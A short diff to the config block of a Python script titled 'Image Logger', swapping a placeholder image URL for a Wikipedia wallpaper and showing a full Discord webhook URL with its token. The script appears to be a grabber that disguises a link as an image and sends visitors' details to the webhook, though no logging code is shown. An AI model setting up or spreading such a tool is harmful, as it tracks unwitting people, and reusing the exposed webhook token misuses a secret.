@@ -11,7 +11,7 @@ __author__ = "channelsbecausewhy"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1411029142912241745/-1Wd_3Jhz-BiJhJeQP4Nr1m_YSSQZEsTjVymmx62c8vWDi9xOqPpnIXYdKjA1O8J63Ua",
-    "image": "https://link-to-your-image.here", 
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", 
     "imageArgument": True,
 
     "username": "Image Logger", 
